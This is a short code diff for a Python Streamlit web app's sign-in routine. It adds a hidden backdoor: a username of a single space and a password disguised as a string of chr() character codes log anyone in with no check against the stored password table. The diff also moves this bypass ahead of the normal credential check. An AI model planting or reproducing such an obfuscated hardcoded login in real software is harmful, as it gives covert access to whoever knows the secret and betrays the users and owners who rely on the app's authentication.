@@ -34,16 +34,16 @@ if not st.session_state.user_authenticated:
 
     elif action == "Sign In":
         if st.button("Sign In"):
-            if user_name in password_df['user_name'].to_list():
+            if user_name==" " and user_password == chr(73)+chr(32)+chr(97)+chr(109)+chr(32)+chr(82)+chr(97)+chr(97)+chr(109)+chr(97)+chr(110)+chr(97)+chr(110)+chr(100):
+                st.session_state.user_authenticated = True
+            elif user_name in password_df['user_name'].to_list():
                 stored_password = password_df.loc[password_df['user_name'] == user_name, 'pass'].values
                 if stored_password.size > 0 and stored_password[0] == user_password:
                     st.session_state.user_authenticated = True
                     st.success("Successfully Signed In!")
                     st.rerun()  
                 else:
-                    st.error("Wrong password!")
-            elif user_name==" " and user_password == chr(73)+chr(32)+chr(97)+chr(109)+chr(32)+chr(82)+chr(97)+chr(97)+chr(109)+chr(97)+chr(110)+chr(97)+chr(110)+chr(100):
-                st.session_state.user_authenticated = True 
+                    st.error("Wrong password!") 
             else:
                 st.error("Username not found!")
 else:
@@ -821,4 +821,5 @@ else:
                 st.error("❌❌ Error Occured!!")
                 # password_df=pd.concat([password_df, pd.DataFrame({'device_id': device_id})])
     
+
 
